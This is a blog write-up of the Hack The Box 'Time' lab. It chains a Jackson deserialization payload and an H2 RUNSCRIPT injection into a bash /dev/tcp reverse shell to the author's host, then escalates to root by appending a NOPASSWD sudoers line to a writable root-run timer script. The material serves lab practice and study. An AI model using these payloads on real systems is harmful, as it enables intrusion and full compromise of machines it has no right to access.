<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="pv-proxy-endpoint" content="https://myochosite-291718.appspot.com/query?id=ahNwfm15b2Nob3NpdGUtMjkxNzE4chULEghBcGlRdWVyeRiAgIDo14eBCgw"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Lab - HackyHour3 - Time" /><meta property="og:locale" content="en" /><meta name="description" content="Learning Path" /><meta property="og:description" content="Learning Path" /><link rel="canonical" href="https://ocholuo.github.io//posts/HTB-Time/" /><meta property="og:url" content="https://ocholuo.github.io//posts/HTB-Time/" /><meta property="og:site_name" content="Grace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-13T10:11:11-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Lab - HackyHour3 - Time" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-30T21:02:21-04:00","datePublished":"2020-11-13T10:11:11-05:00","description":"Learning Path","headline":"Lab - HackyHour3 - Time","mainEntityOfPage":{"@type":"WebPage","@id":"https://ocholuo.github.io//posts/HTB-Time/"},"url":"https://ocholuo.github.io//posts/HTB-Time/"}</script><title>Lab - HackyHour3 - Time | Grace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Grace"><meta name="application-name" content="Grace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://myochosite-291718.appspot.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://myochosite-291718.appspot.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/huoye.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Grace</a></div><div class="site-subtitle font-italic">2023 Mar 14 updated</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/ocholuo" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Lab - HackyHour3 - Time</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Lab - HackyHour3 - Time</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Grace JyL </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Nov 13, 2020, 10:11 AM -0500" >Nov 13, 2020<i class="unloaded">2020-11-13T10:11:11-05:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Oct 30, 2022, 6:02 PM -0700" >Oct 30, 2022<i class="unloaded">2022-10-30T21:02:21-04:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1418 words">7 min read</span> <span id="pv" class="pageviews"> <i class="fas fa-spinner fa-spin fa-fw"></i> </span> views</div></div><div class="post-content"><p>[toc]</p><hr /><h1 id="time">time</h1><p><img data-proofer-ignore data-src="https://i.imgur.com/Y6Qhdg8.png" width="700" /></p><blockquote><p>Machine: Time</p></blockquote><h2 id="step-1-recon">Step 1: Recon</h2><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.129.32.8
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-10-31 00:21 UTC
Nmap scan report <span class="k">for </span>ip-10-129-32-8.ec2.internal <span class="o">(</span>10.129.32.8<span class="o">)</span>
Host is up <span class="o">(</span>0.083s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Online JSON parser
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel


Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: No content to map due to end-of-input

Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token <span class="s1">'ture'</span>: was expecting <span class="s1">'null'</span>, <span class="s1">'true'</span>, <span class="s1">'false'</span> or NaN

Validation failed:
Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token <span class="s1">'microtaskDebounce'</span>: was expecting <span class="o">(</span><span class="s1">'true'</span>, <span class="s1">'false'</span> or <span class="s1">'null'</span><span class="o">)</span>

Validation failed:
Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token <span class="s1">'w'</span>: was expecting <span class="o">(</span><span class="s1">'true'</span>, <span class="s1">'false'</span> or <span class="s1">'null'</span><span class="o">)</span>

Validation failed:
Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token <span class="s1">'w'</span>: was expecting <span class="o">(</span><span class="s1">'true'</span>, <span class="s1">'false'</span> or <span class="s1">'null'</span><span class="o">)</span>

Validation failed:
Unhandled Java exception:
com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token <span class="o">(</span>START_OBJECT<span class="o">)</span>,
expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY <span class="nb">type </span>information <span class="k">for </span>class java.lang.Object



Payload:Validation failed:
Unhandled Java exception:
com.fasterxml.jackson.databind.JsonMappingException: URL format error<span class="p">;</span>
must be <span class="s2">"jdbc:h2:{ {.|mem:}[name] | [file:]fileName | {tcp|ssl}:[//]server[:port][,server2[:port]]/name }[;key=value...]"</span>
but is  <span class="s2">"jdbc:h2:tcp://10.10.14.50:8989"</span> <span class="o">[</span>90046-199] <span class="o">(</span>through reference chain: ch.qos.logback.core.db.DriverManagerConnectionSource[<span class="s2">"connection"</span><span class="o">])</span>


<span class="o">[</span><span class="s2">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, <span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"jdbc:h2:tcp://10.10.14.50/"</span><span class="o">}]</span>

Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.JsonMappingException:
Connection is broken: <span class="s2">"java.net.ConnectException: Connection refused (Connection refused): 10.10.14.50"</span> <span class="o">[</span>90067-199] <span class="o">(</span>through reference chain: ch.qos.logback.core.db.DriverManagerConnectionSource[<span class="s2">"connection"</span><span class="o">])</span>



Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.JsonMappingException:
No suitable driver found <span class="k">for </span>jdbc:tcp://10.10.14.50/ <span class="o">(</span>through reference chain: ch.qos.logback.core.db.DriverManagerConnectionSource[<span class="s2">"connection"</span><span class="o">])</span>


<span class="o">[</span><span class="s2">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, <span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"jdbc:h2:tcp://10.10.14.50/"</span><span class="o">}]</span>

<span class="nv">$ </span>nc <span class="nt">-vv</span> <span class="nt">-l</span> 10.129.32.8 <span class="nt">-p</span> 9000


<span class="s2">"[</span><span class="se">\"</span><span class="s2">ch.qos.logback.core.db.DriverManagerConnectionSource </span><span class="nv">$ </span><span class="s2">nc -lv 9000 rce</span><span class="se">\"</span><span class="s2">, {"</span>url<span class="s2">":"</span>jdbc:h2:tcp://10.129.32.8/<span class="s2">"}]"</span>

Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unexpected character <span class="o">(</span><span class="s1">'u'</span> <span class="o">(</span>code 117<span class="o">))</span>: was expecting comma to separate Array entries

Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unexpected character <span class="o">(</span><span class="s1">'\'</span> <span class="o">(</span>code 92<span class="o">))</span>: expected a valid value <span class="o">(</span>number, String, array, object, <span class="s1">'true'</span>, <span class="s1">'false'</span> or <span class="s1">'null'</span><span class="o">)</span>


Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.InvalidTypeIdException:
Could not resolve <span class="nb">type id</span> <span class="s1">'ch.qos.logback.core.db.DriverManagerConnectionSource $ nc -lv 9000 rce'</span> as a subtype of <span class="o">[</span>simple <span class="nb">type</span>, class java.lang.Object]: no such class found


<span class="s2">"[</span><span class="se">\"</span><span class="s2">ch.qos.logback.core.db.DriverManagerConnectionSource </span><span class="nv">$ </span><span class="s2">nc -lv 9000 rce</span><span class="se">\"</span><span class="s2">, {"</span>url<span class="s2">":"</span>jdbc:h2:tcp://10.129.32.8/<span class="s2">"}]"</span>
<span class="c"># Validation successful!</span>


<span class="s2">"["</span>ch.qos.logback.core.db.DriverManagerConnectionSource<span class="s2">", {"</span>url<span class="s2">":"</span>jdbc:h2:mem:<span class="p">;</span><span class="nv">TRACE_LEVEL_SYSTEM_OUT</span><span class="o">=</span>3<span class="p">;</span><span class="nv">INIT</span><span class="o">=</span>RUNSCRIPT FROM <span class="s1">'http://localhost:9000/inject.sql'</span><span class="s2">"}]"</span>





<span class="c"># setup the web page</span>

python <span class="nt">-m</span> SimpleHTTPServer 9000 <span class="c"># py2</span>
python3 <span class="nt">-m</span> http.server 9000

http://0.0.0.0:9000/


<span class="s2">"[</span><span class="se">\"</span><span class="s2">ch.qos.logback.core.db.DriverManagerConnectionSource </span><span class="nv">$ </span><span class="s2">nc -lv 9000 rce</span><span class="se">\"</span><span class="s2">, {"</span>url<span class="s2">":"</span>jdbc:h2:mem:<span class="p">;</span><span class="nv">TRACE_LEVEL_SYSTEM_OUT</span><span class="o">=</span>3<span class="p">;</span><span class="nv">INIT</span><span class="o">=</span>RUNSCRIPT FROM <span class="s1">'http://localhost:9000/inject.sql'</span><span class="s2">"}]"</span>
<span class="c"># Validation successful!</span>


<span class="s2">"["</span>ch.qos.logback.core.db.DriverManagerConnectionSource<span class="s2">", {"</span>url<span class="s2">":"</span>jdbc:h2:mem:<span class="p">;</span><span class="nv">TRACE_LEVEL_SYSTEM_OUT</span><span class="o">=</span>3<span class="p">;</span><span class="nv">INIT</span><span class="o">=</span>RUNSCRIPT FROM <span class="s1">'http://localhost:9000/inject.sql'</span><span class="s2">"}]"</span>


<span class="o">[</span><span class="s2">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, <span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.50:9000/inject.sql'"</span><span class="o">}]</span>
<span class="c"># running for long time</span>
<span class="c"># Validation failed: 2020-10-31 01:59:30 command: slow query: 118 ms</span>


<span class="o">[</span><span class="s2">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, <span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.129.32.8:9000/inject.sql'"</span><span class="o">}]</span>
<span class="c"># Validation failed: 2020-10-31 01:56:26 lock: 3 shared read lock unlock SYS</span>


<span class="o">[</span><span class="s2">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, <span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://0.0.0.0:9000/inject.sql'"</span><span class="o">}]</span>
<span class="c"># Validation failed: 2020-10-31 01:53:53 lock: 3 shared read lock unlock SYS</span>

<span class="s2">"[</span><span class="se">\"</span><span class="s2">ch.qos.logback.core.db.DriverManagerConnectionSource</span><span class="se">\"</span><span class="s2">, {"</span>url<span class="s2">":"</span>jdbc:h2:mem:<span class="p">;</span><span class="nv">TRACE_LEVEL_SYSTEM_OUT</span><span class="o">=</span>3<span class="p">;</span><span class="nv">INIT</span><span class="o">=</span>RUNSCRIPT FROM <span class="s1">'http://0.0.0.0:9000/inject.sql'</span><span class="s2">"}]"</span>
<span class="c"># Validation successful!</span>

<span class="s2">"[</span><span class="se">\"</span><span class="s2">ch.qos.logback.core.db.DriverManagerConnectionSource</span><span class="se">\"</span><span class="s2">, {"</span>url<span class="s2">":"</span>jdbc:h2:mem:<span class="p">;</span><span class="nv">TRACE_LEVEL_SYSTEM_OUT</span><span class="o">=</span>3<span class="p">;</span><span class="nv">INIT</span><span class="o">=</span>RUNSCRIPT FROM <span class="s1">'http://10.129.32.8:9000/inject.sql'</span><span class="s2">"}]"</span>
<span class="c"># Validation successful!</span>


<span class="o">[</span><span class="s2">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, <span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.129.32.8:9000/inject.sql'"</span><span class="o">}]</span>
<span class="c"># Validation failed: 2020-10-31 02:09:42 lock: 3 shared read lock unlock SYS</span>


<span class="o">[</span><span class="s2">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, <span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.50:9000/inject.sql'"</span><span class="o">}]</span>
<span class="c"># CALL SHELLEXEC('nc 10.10.14.50 9000')</span>
<span class="c"># Validation failed: 2020-10-31 02:28:18 command: slow query: 641 ms</span>
<span class="c"># Validation failed: 2020-10-31 02:31:47 command: slow query: 632 ms</span>
<span class="c"># Validation failed: 2020-10-31 02:33:06 command: slow query: 647 ms</span>
<span class="c"># Validation failed: 2020-10-31 02:33:06 command: slow query: 647 ms</span>

<span class="c"># htbox        &gt;  my kali listen on 2424</span>
<span class="c"># 10.129.32.8     10.10.14.50</span>



<span class="o">[</span><span class="s2">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, <span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.50:9000/inject.sql'"</span><span class="o">}]</span>
<span class="c"># CALL SHELLEXEC('nc 10.10.14.50 2424 –e /bin/bash')</span>
<span class="c"># CALL SHELLEXEC('nc -e /bin/sh 10.10.14.50 2424')</span>
<span class="c"># host:</span>
<span class="c"># $ nc -vv -l 0.0.0.0 -p 2424</span>
<span class="c"># 0.0.0.0: inverse host lookup failed: Unknown host</span>
<span class="c"># listening on [any] 2424 ...</span>
<span class="c"># invalid connection to [10.10.14.50] from ip-10-129-32-8.ec2.internal [10.129.32.8] 58842</span>
<span class="c"># htb:</span>
<span class="c"># Validation failed: 2020-10-31 02:43:35 lock: 3 exclusive write lock requesting for SYS</span>

<span class="o">[</span><span class="s2">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, <span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.50:9004/inject.sql'"</span><span class="o">}]</span>


<span class="c"># be careful for the special character:</span>
<span class="o">[</span><span class="s2">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, <span class="o">{</span><span class="s2">"url"</span>:<span class="s2">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.50:9000/inject.sql'"</span><span class="o">}]</span>



<span class="c"># inject.sql:</span>
bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.50/2424 0&gt;&amp;1


<span class="c"># host:</span>
nc <span class="nt">-lvp</span> 2424
listening on <span class="o">[</span>any] 2424 ...
connect to <span class="o">[</span>10.10.14.50] from ip-10-129-32-8.ec2.internal <span class="o">[</span>10.129.32.8] 58866
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>960<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
pericles@time:/var/www/html<span class="err">$</span>


hashcat <span class="nt">-m</span> 1400 <span class="nt">-a</span> 0 <span class="nt">-o</span> 10790631378d0d5e0d85e40ca7f23a17 /usr/share/wordlists/rockyou.txt

</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>require 'java'
Dir["./classpath/*.jar"].each do |f|
    require f
end
java_import 'com.fasterxml.jackson.databind.ObjectMapper'
java_import 'com.fasterxml.jackson.databind.SerializationFeature'

content = ARGV[0]

puts "Mapping"
mapper = ObjectMapper.new
mapper.enableDefaultTyping()
mapper.configure(SerializationFeature::FAIL_ON_EMPTY_BEANS, false);
puts "Serializing"
obj = mapper.readValue(content, java.lang.Object.java_class) # invokes all the setters
puts "objectified"
puts "stringified: " + mapper.writeValueAsString(obj)
</pre></table></code></div></div><div class="language-sql highlighter-rouge"><div class="code-header" text-data="sql"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="c1">-- CREATE ALIAS SHELLEXEC</span>
<span class="k">CREATE</span> <span class="k">ALIAS</span> <span class="n">SHELLEXEC</span> <span class="k">AS</span> <span class="err">$$</span> <span class="n">String</span> <span class="n">shellexec</span><span class="p">(</span><span class="n">String</span> <span class="n">cmd</span><span class="p">)</span> <span class="n">throws</span> <span class="n">java</span><span class="p">.</span><span class="n">io</span><span class="p">.</span><span class="n">IOException</span> <span class="p">{</span>
    <span class="n">String</span><span class="p">[]</span> <span class="n">command</span> <span class="o">=</span> <span class="p">{</span><span class="nv">"bash"</span><span class="p">,</span> <span class="nv">"-c"</span><span class="p">,</span> <span class="n">cmd</span><span class="p">};</span>
    <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Scanner</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="n">getRuntime</span><span class="p">().</span><span class="k">exec</span><span class="p">(</span><span class="n">command</span><span class="p">).</span><span class="n">getInputStream</span><span class="p">()).</span><span class="n">useDelimiter</span><span class="p">(</span><span class="nv">"</span><span class="se">\A</span><span class="nv">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="n">hasNext</span><span class="p">()</span> <span class="o">?</span> <span class="n">s</span><span class="p">.</span><span class="k">next</span><span class="p">()</span> <span class="p">:</span> <span class="nv">""</span><span class="p">;</span>  <span class="p">}</span>
<span class="err">$$</span><span class="p">;</span>

<span class="c1">-- CALL ALIAS SHELLEXEC with iput</span>
<span class="c1">-- CALL SHELLEXEC('id &gt; exploited.txt')</span>
<span class="k">CALL</span> <span class="n">SHELLEXEC</span><span class="p">(</span><span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.50/2424 0&gt;&amp;1'</span><span class="p">)</span>
</pre></table></code></div></div><p>inside the box</p><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre><td class="rouge-code"><pre>pericles@time: <span class="nb">cd</span> /home/pericles/snap/lxd/current/.config/lxc


pericles@time:/home/pericles/snap/lxd/current/.config/lxc<span class="nv">$ </span><span class="nb">cat </span>config.yml
<span class="nb">cat </span>config.yml
default-remote: <span class="nb">local
</span>remotes:
  images:
    addr: https://images.linuxcontainers.org
    protocol: simplestreams
    public: <span class="nb">true
  local</span>:
    addr: unix://
    public: <span class="nb">false
</span>aliases: <span class="o">{}</span>

ps fauxwww


pericles@time:/home/pericles/snap/lxd/current/.config/lxc<span class="nv">$ </span>lxc remote list
lxc remote list
+-----------------+------------------------------------------+---------------+-------------+--------+--------+
|      NAME       |                   URL                    |   PROTOCOL    |  AUTH TYPE  | PUBLIC | STATIC |
+-----------------+------------------------------------------+---------------+-------------+--------+--------+
| images          | https://images.linuxcontainers.org       | simplestreams | none        | YES    | NO     |
+-----------------+------------------------------------------+---------------+-------------+--------+--------+
| <span class="nb">local</span> <span class="o">(</span>default<span class="o">)</span> | unix://                                  | lxd           | file access | NO     | YES    |
+-----------------+------------------------------------------+---------------+-------------+--------+--------+
| ubuntu          | https://cloud-images.ubuntu.com/releases | simplestreams | none        | YES    | YES    |
+-----------------+------------------------------------------+---------------+-------------+--------+--------+
| ubuntu-daily    | https://cloud-images.ubuntu.com/daily    | simplestreams | none        | YES    | YES    |
+-----------------+------------------------------------------+---------------+-------------+--------+--------+

<span class="c"># reverse version does not work</span>
pericles@time:/home/pericles<span class="nv">$ </span>snap revert snap <span class="nt">--revision</span><span class="o">=</span>2.37.1
snap revert snap <span class="nt">--revision</span><span class="o">=</span>2.37.1
error: access denied <span class="o">(</span>try with <span class="nb">sudo</span><span class="o">)</span>



pericles@time:/home/pericles/snap/lxd/current/.config/lxc<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-aslh</span> /run/snapd<span class="k">*</span>
&lt;/snap/lxd/current/.config/lxc<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-aslh</span> /run/snapd<span class="k">*</span>
0 srw-rw-rw- 1 root root  0 Nov  7 00:37 /run/snapd-snap.socket
0 srw-rw-rw- 1 root root  0 Nov  7 00:37 /run/snapd.socket



/run/snapd:
total 0
0 drwxr-xr-x  4 root root  80 Nov  7 00:37 <span class="nb">.</span>
0 drwxr-xr-x 27 root root 860 Nov  7 01:34 ..
0 drwxr-xr-x  2 root root  80 Nov  7 00:37 lock
0 drwxr-xr-x  2 root root 100 Nov  7 00:37 ns
</pre></table></code></div></div><h1 id="right-path">right path</h1><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre><span class="c"># long process</span>
<span class="nv">$ </span>ps fauxwww
ps faxwxxx
    PID TTY      STAT   TIME COMMAND
      2 ?        S      0:00 <span class="o">[</span>kthreadd]
      3 ?        I&lt;     0:00  <span class="se">\_</span> <span class="o">[</span>rcu_gp]


<span class="c"># run a script</span>
<span class="nv">$ </span>linpeas.sh

<span class="o">[</span>+] .sh files <span class="k">in </span>path
<span class="o">[</span>i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh
You own the script: /usr/bin/timer_backup.sh
/usr/bin/rescan-scsi-bus.sh


<span class="nv">$ </span><span class="nb">cd</span> /usr/bin
total 114572
drwxr-xr-x  2 root     root        36864 Oct 23 06:41 <span class="nb">.</span>
drwxr-xr-x 14 root     root         4096 Apr 23  2020 ..
lrwxrwxrwx  1 root     root            4 Feb 17  2020 NF -&gt; col1

<span class="nv">$ </span><span class="nb">cd</span> /etc/sudoers.d
total 20
drwxr-xr-x   2 root root 4096 Nov 14 01:38 <span class="nb">.</span>
drwxr-xr-x 102 root root 4096 Oct 23 06:44 ..
<span class="nt">-r--r-----</span>   1 root root   91 Apr 10  2020 99-snapd.conf
<span class="nt">-r--r-----</span>   1 root root  958 Feb  3  2020 README
<span class="nt">-rw-r--r--</span>   1 root root   33 Nov 14 01:39 rw

<span class="nv">$ </span><span class="nb">touch </span>rw

<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"echo 'pericles ALL=(ALL) NOPASSWD: ALL' &gt; etc/sudoers.d/rw"</span> <span class="o">&gt;&gt;</span> /usr/bin/timer_backup.sh

<span class="nv">$ </span><span class="nb">cat</span> /usr/bin/timer_backup.sh
<span class="c">#!/bin/bash</span>
zip <span class="nt">-r</span> website.bak.zip /var/www/html <span class="o">&amp;&amp;</span> <span class="nb">mv </span>website.bak.zip /root/backup.zip
<span class="nb">echo</span> <span class="s1">'pericles ALL=(ALL) NOPASSWD: ALL'</span> <span class="o">&gt;</span> etc/sudoers.d/rw


pericles@time:/etc/sudoers.d<span class="nv">$ </span><span class="nb">sudo </span>su -
<span class="nb">sudo </span>su -
<span class="nb">whoami
</span>root

